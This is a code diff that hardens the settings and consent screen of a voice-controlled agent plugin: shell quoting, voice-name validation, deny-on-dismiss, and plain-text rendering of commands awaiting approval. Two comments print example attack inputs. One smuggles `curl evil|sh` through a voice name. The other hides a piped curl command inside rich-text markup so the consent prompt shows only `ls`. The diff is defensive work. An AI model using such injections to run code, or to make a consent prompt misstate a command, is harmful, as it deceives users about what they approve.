@@ -27,6 +27,9 @@ Item {
   property string mode: "settings"
   property var request: ({})
   property int secondsLeft: 0
+  // True once a verdict has been written for the request on screen, so
+  // closing the card does not write a second one.
+  property bool answered: false
 
   // Shares the [menu] surface tokens, so themes that style the menu style
   // this too.
@@ -65,13 +68,13 @@ Item {
     { label: "hey mycroft", value: "hey_mycroft" },
     { label: "hey marvin",  value: "hey_marvin" }
   ].concat(customModels)
-  //: Whether openWakeWord is in the environment at all. install.sh asks, and
-  //: --no-oww is a supported answer: the default engine is Vosk and the daemon
-  //: falls back to it if openWakeWord is chosen and missing. That fallback is
-  //: silent from here, though, so the settings would offer an engine that
-  //: cannot run and then show its model picker, threshold and verifier while
-  //: Vosk was actually listening. Same failure as offering a voice that is not
-  //: downloaded, and found by asking the same question of it.
+  // Whether openWakeWord is in the environment at all. install.sh does not
+  // install it unless asked (--oww): the default engine is Vosk and the daemon
+  // falls back to it if openWakeWord is chosen and missing. That fallback is
+  // silent from here, though, so the settings would offer an engine that
+  // cannot run and then show its model picker, threshold and verifier while
+  // Vosk was actually listening. Same failure as offering a voice that is not
+  // downloaded, and found by asking the same question of it.
   property bool owwAvailable: true
   Process {
     id: scanOww
@@ -91,11 +94,11 @@ Item {
                : "openWakeWord — four phrases, better rejection  (not installed)",
       value: "openwakeword" }
   ]
-  //: Which voices are actually on disk. install.sh fetches one by default
-  //: and the one the settings ask for; the rest are 60MB each and arrive
-  //: only if chosen. Offering all six without saying which are present let
-  //: someone pick a voice that does not exist, and the only symptom was
-  //: silence with the reason in a log.
+  // Which voices are actually on disk. install.sh fetches one by default
+  // and the one the settings ask for; the rest are 60MB each and arrive
+  // only if chosen. Offering all six without saying which are present let
+  // someone pick a voice that does not exist, and the only symptom was
+  // silence with the reason in a log.
   property var voicesOnDisk: []
   Process {
     id: scanVoices
@@ -150,17 +153,17 @@ Item {
   property bool vGoverned: true
   property bool vVerifier: false
 
-  //: The phrase actually being listened for. Both engines keep their own
-  //: key and the inactive one stays in shell.json, so reading the raw
-  //: setting would name a phrase nothing is listening for.
+  // The phrase actually being listened for. Both engines keep their own
+  // key and the inactive one stays in shell.json, so reading the raw
+  // setting would name a phrase nothing is listening for.
   readonly property string activePhrase:
     root.usingOww ? String(root.setting("owwModel", "hey_jarvis")).replace(/_/g, " ")
                   : String(root.setting("phrase", "hey computer"))
   readonly property string projectDir: setting("projectDir", "")
 
-  //: Levels are stored per agent: trust is a judgement about one program's
-  //: capabilities, and letting it survive `omarchy default agent` would hand
-  //: the next one a decision nobody made about it.
+  // Levels are stored per agent: trust is a judgement about one program's
+  // capabilities, and letting it survive `omarchy default agent` would hand
+  // the next one a decision nobody made about it.
   function setLevel(value) {
     var all = {}
     var current = cfg["permissions"]
@@ -187,22 +190,37 @@ Item {
   readonly property bool speakReplies: setting("speakReplies", true)
   readonly property string engine: setting("engine", "vosk")
   readonly property bool usingOww: engine === "openwakeword"
-  //: Selected *and* able to run. The daemon falls back to Vosk when
-  //: openWakeWord is chosen and not installed, so every control that only
-  //: makes sense while openWakeWord is really listening keys off this, not
-  //: off the setting -- otherwise the page describes an engine that is not
-  //: running.
+  // Selected *and* able to run. The daemon falls back to Vosk when
+  // openWakeWord is chosen and not installed, so every control that only
+  // makes sense while openWakeWord is really listening keys off this, not
+  // off the setting -- otherwise the page describes an engine that is not
+  // running.
   readonly property bool owwLive: usingOww && owwAvailable
 
   function open(payloadJson) {
     mode = "settings"
+    var wanted = ""
     try {
       var p = JSON.parse(payloadJson || "{}")
       if (p.mode === "permission") mode = "permission"
+      if (p.id) wanted = String(p.id)
     } catch (e) {}
 
     opened = true
     if (mode === "permission") {
+      // Reset, both of them. `request` held the previous question until the
+      // probe came back, and `secondsLeft` held the previous countdown --
+      // so the card could open showing a stale command with a stale number
+      // beside it, which is the one thing a consent prompt must not do.
+      request = ({})
+      secondsLeft = 0
+      answered = false
+      // Asked for by id. The hook names the request it is summoning us
+      // about, and taking "the newest" instead meant that a second question
+      // arriving first put the wrong command on screen above the wrong
+      // Allow button.
+      pendingProbe.command = wanted ? ["agentvoice", "pending", wanted]
+                                    : ["agentvoice", "pending"]
       pendingProbe.running = true
     } else {
       cfgReload.running = true
@@ -214,9 +232,10 @@ Item {
   }
 
   function answer(verdict) {
-    if (!request || !request.id) { dismiss(); return }
+    if (!request || !request.id) { close(); return }
     permit.command = ["agentvoice", "permit", String(request.id), verdict]
     permit.running = true
+    answered = true
     dismiss()
   }
 
@@ -226,7 +245,6 @@ Item {
   // here so the two do not have to agree on a payload schema.
   Process {
     id: pendingProbe
-    command: ["agentvoice", "pending"]
     stdout: StdioCollector {
       onStreamFinished: {
         try { root.request = JSON.parse(String(text).trim() || "{}") }
@@ -249,23 +267,57 @@ Item {
   }
   function close() { opened = false }
   function dismiss() {
+    // Esc, or a click outside the card, is an answer: no. It used to be
+    // neither -- the card went away and the agent stayed blocked until the
+    // timeout, with no way to bring the question back. Silence already
+    // means no in the hook, so saying so now only makes it immediate.
+    if (mode === "permission" && !answered && request && request.id) {
+      answer("deny")
+      return
+    }
     if (shell && typeof shell.hide === "function")
       shell.hide((manifest && manifest.id) || "duaneoca.agentvoice")
     else close()
   }
 
-  //: Run the installer for something chosen here that is not on the machine.
-  //: Choosing is the request -- a separate button to confirm it was a step
-  //: nobody looked for. Arguments are passed explicitly rather than read back
-  //: out of settings, because `omarchy bar set` has not necessarily landed by
-  //: the time this runs.
+  // Single-quote one argument for a shell. The launcher takes a command
+  // line, not an argv: it does `cmd="$*"` and runs `bash -c "$cmd"`. So
+  // everything handed to it is shell source, and an unquoted $HOME with a
+  // space in it, or a voice name of `x;curl evil|sh`, is a command.
+  function shq(s) {
+    return "'" + String(s).replace(/'/g, "'\\''") + "'"
+  }
+
+  readonly property string configHome:
+      Quickshell.env("XDG_CONFIG_HOME")
+      || ((Quickshell.env("HOME") || "") + "/.config")
+  readonly property string dataHome:
+      Quickshell.env("XDG_DATA_HOME")
+      || ((Quickshell.env("HOME") || "") + "/.local/share")
+
+  // Run the installer for something chosen here that is not on the machine.
+  // Choosing is the request -- a separate button to confirm it was a step
+  // nobody looked for. Arguments are passed explicitly rather than read back
+  // out of settings, because `omarchy bar set` has not necessarily landed by
+  // the time this runs. `args` is an array, and every element is quoted.
   function fetchNow(args) {
-    fetcher.command = ["omarchy-launch-floating-terminal-with-presentation",
-                       Quickshell.env("HOME") +
-                       "/.config/omarchy/plugins/duaneoca.agentvoice/install.sh " +
-                       args + " --no-keybinds"]
+    var cmd = shq(root.configHome
+                  + "/omarchy/plugins/duaneoca.agentvoice/install.sh")
+    var argv = ["--no-keybinds"].concat(args)
+    for (var i = 0; i < argv.length; i++) cmd += " " + shq(argv[i])
+    fetcher.command = ["omarchy-launch-floating-terminal-with-presentation", cmd]
     fetcher.running = true
     root.dismiss()
+  }
+
+  // A Piper voice name, and nothing else, may become part of that command
+  // line. shell.json is written by this screen, by `omarchy bar set`, by a
+  // dotfile sync and by hand, so the value arriving here is not necessarily
+  // one this screen ever offered. Quoting alone would be enough; checking
+  // the shape as well means a junk value fails visibly rather than running.
+  function fetchVoice(v) {
+    if (!/^[a-z][a-z0-9_]*-(x_low|low|medium|high)$/.test(String(v))) return
+    root.fetchNow(["--voice=" + v])
   }
 
   Process { id: fetcher }
@@ -448,29 +500,85 @@ Item {
             width: parent.width
             wrapMode: Text.WordWrap
             text: "The agent wants to run " + (root.request.tool || "a tool") + "."
+            textFormat: Text.PlainText
             color: root.foreground
             font.family: root.fontFamily
             font.pixelSize: Style.font.body
           }
 
+          // Why this one is being asked about, when the tool and the path do
+          // not say it on their own -- a Read is usually free, so a Read that
+          // prompts has a reason worth putting on screen.
+          Text {
+            width: parent.width
+            wrapMode: Text.WordWrap
+            visible: (root.request.note || "") !== ""
+            text: root.request.note || ""
+            textFormat: Text.PlainText
+            color: Color.urgent
+            font.family: root.fontFamily
+            font.pixelSize: Style.font.caption
+          }
+
           // The command itself, verbatim. Paraphrasing what is about to run
-          // would defeat the point of asking.
+          // would defeat the point of asking -- and so does showing only as
+          // much of it as happens to fit, which is why this scrolls: the card
+          // is capped in height, and a long command used to be cut off at the
+          // bottom edge with nothing to say it had been.
           BorderSurface {
             width: parent.width
-            height: Math.max(Style.space(44), cmd.implicitHeight + Style.space(16))
+            height: Math.min(Style.space(160),
+                             Math.max(Style.space(44),
+                                      cmd.implicitHeight + Style.space(16)))
             radius: Style.cornerRadius
             color: Qt.darker(root.background, 1.25)
             borderSpec: root.borderSpec
-            Text {
-              id: cmd
+
+            Flickable {
+              id: cmdScroll
               anchors.fill: parent
               anchors.margins: Style.space(8)
-              wrapMode: Text.WrapAnywhere
-              text: root.request.summary || "(no detail)"
-              color: root.foreground
-              font.family: "monospace"
-              font.pixelSize: Style.font.caption
+              contentWidth: width
+              contentHeight: cmd.implicitHeight
+              clip: true
+              boundsBehavior: Flickable.StopAtBounds
+              flickableDirection: Flickable.VerticalFlick
+              interactive: contentHeight > height
+              QQC.ScrollBar.vertical: QQC.ScrollBar {
+                policy: QQC.ScrollBar.AsNeeded
+              }
+
+              Text {
+                id: cmd
+                width: cmdScroll.width
+                wrapMode: Text.WrapAnywhere
+                text: root.request.summary || "(no detail)"
+                // The one Text in this file that must never be rich: it is
+                // the command about to run. `ls <b></b><!-- ; curl x | sh -->`
+                // renders as `ls` under AutoText, which turns the prompt
+                // into a lie about what is being consented to.
+                textFormat: Text.PlainText
+                color: root.foreground
+                font.family: "monospace"
+                font.pixelSize: Style.font.caption
+              }
             }
+          }
+
+          // How much of it there is, since the card shows a window onto it.
+          Text {
+            width: parent.width
+            visible: (root.request.length || 0) > 0
+            text: (root.request.length || 0) + " characters"
+                  + ((root.request.truncated || 0) > 0
+                     ? ", " + root.request.truncated + " of them not shown"
+                     : "")
+                  + (cmdScroll.contentHeight > cmdScroll.height
+                     ? " · scroll to read it all" : "")
+            textFormat: Text.PlainText
+            color: (root.request.truncated || 0) > 0 ? Color.urgent : root.dim
+            font.family: root.fontFamily
+            font.pixelSize: Style.font.caption
           }
 
           Row {
@@ -676,6 +784,26 @@ Item {
                 font.pixelSize: Style.font.caption
               }
 
+              // Left empty, the agent still starts in the home directory --
+              // but home is not a project, and "edits" will not write
+              // unasked there. Said here because the silent version of this
+              // was the worst of both: a blanket grant over .bashrc, the
+              // systemd units and shell.json, which is where this very
+              // setting lives.
+              Text {
+                width: parent.width
+                wrapMode: Text.WordWrap
+                visible: root.projectDir.trim() === ""
+                         && root.permissionLevel === "edits"
+                text: "⚠  No folder set, so there is nothing for “edits” to be " +
+                      "inside: every change is prompted until you name one. " +
+                      "Your home directory is not accepted as a project — it " +
+                      "holds the file this permission level is stored in."
+                color: Color.urgent
+                font.family: root.fontFamily
+                font.pixelSize: Style.font.caption
+              }
+
               Dropdown {
                 width: parent.width
                 showLabel: true
@@ -698,13 +826,17 @@ Item {
                             "may refuse work rather than ask. Only the trusted level " +
                             "changes that.")
                          : root.permissionLevel === "edits"
-                         ? "Files inside the project can be edited without asking. " +
-                           "Commands, web fetches and anything outside it still prompt."
+                         ? "Source files inside the project can be edited without " +
+                           "asking. Commands, web fetches and anything outside it " +
+                           "still prompt — and so do files that make something else " +
+                           "run, like .git/hooks, .envrc or .claude/settings.json."
                          : root.permissionLevel === "trusted"
                          ? "Nothing is asked. A spoken sentence can edit files and run " +
                            "commands here with nothing able to stop it."
-                         : "Every change is prompted. Read-only tools are never asked " +
-                           "about, and an unanswered prompt is denied.")
+                         : "Every change is prompted, and so is anything that " +
+                           "reaches the network or your own MCP servers. Reading " +
+                           "is free except for keys, credentials and shell " +
+                           "history. An unanswered prompt is denied.")
                 color: root.permissionLevel === "trusted" ? Color.urgent : root.dim
                 font.family: root.fontFamily
                 font.pixelSize: Style.font.caption
@@ -801,7 +933,7 @@ Item {
                 onChanged: function(v) {
                   root.persist("engine", v, false)
                   if (v === "openwakeword" && !root.owwAvailable)
-                    root.fetchNow("--oww")
+                    root.fetchNow(["--oww"])
                 }
               }
 
@@ -820,7 +952,7 @@ Item {
                   wrapMode: Text.WordWrap
                   text: "openWakeWord is not installed, so Vosk is listening instead. " +
                         "It was offered during install and can be added now — about " +
-                        "100MB, and it brings real rejection plus verifiers trained " +
+                        "154MB, and it brings real rejection plus verifiers trained " +
                         "from your own voice."
                   color: Color.urgent
                   font.family: root.fontFamily
@@ -831,7 +963,7 @@ Item {
                   text: "Try installing openWakeWord again…"
                   fontFamily: root.fontFamily
                   onClicked: {
-                    root.fetchNow("--oww")
+                    root.fetchNow(["--oww"])
                   }
                 }
               }
@@ -882,7 +1014,7 @@ Item {
                 foreground: root.foreground; fontFamily: root.fontFamily
                 label: "Detection threshold"
                 unit: "%"
-                description: "Measured here: the real phrase peaks near 99 and a " +
+                description: "Measured on a 2014 MacBook Pro: the real phrase peaks near 99 and a " +
                              "phonetically similar phrase near 90, so 90 rejects " +
                              "the near miss and still fires reliably."
                 value: root.setting("owwThresholdPct", 90)
@@ -982,7 +1114,7 @@ Item {
                   // a user can see -- the daemon just falls back again. Send them
                   // to the installer instead, which is the actual precondition.
                   if (!root.owwAvailable) {
-                    root.fetchNow("--oww")
+                    root.fetchNow(["--oww"])
                     return
                   }
                   if (!root.usingOww) {
@@ -1262,7 +1394,7 @@ Item {
                   root.persist("voice", v, false)
                   if (root.voicesOnDisk.length > 0
                       && root.voicesOnDisk.indexOf(v) < 0)
-                    root.fetchNow("--voice=" + v)
+                    root.fetchVoice(v)
                 }
               }
 
@@ -1294,8 +1426,8 @@ Item {
                   // flag exists to avoid.
                   text: "Try the download again\u2026"
                   fontFamily: root.fontFamily
-                  onClicked: root.fetchNow(
-                      "--voice=" + root.setting("voice", "lessac-medium"))
+                  onClicked: root.fetchVoice(
+                      root.setting("voice", "lessac-medium"))
                 }
               }
             }
@@ -1391,9 +1523,13 @@ Item {
                 // *install* instead. The widget removal used to be chained on
                 // with `&&`; it is --with-widget now, so the script can check
                 // afterwards that it actually happened.
+                // XDG_DATA_HOME, not ~/.local/share: that is where install.sh
+                // puts it, and with the variable set this button used to run
+                // a script that was not there.
                 remover.command = ["omarchy-launch-floating-terminal-with-presentation",
-                                   "\"$HOME/.local/share/agentvoice/app/install.sh\" " +
-                                   "--uninstall --with-widget"]
+                                   root.shq(root.dataHome +
+                                            "/agentvoice/app/install.sh") +
+                                   " --uninstall --with-widget"]
                 remover.running = true
                 root.dismiss()
               }
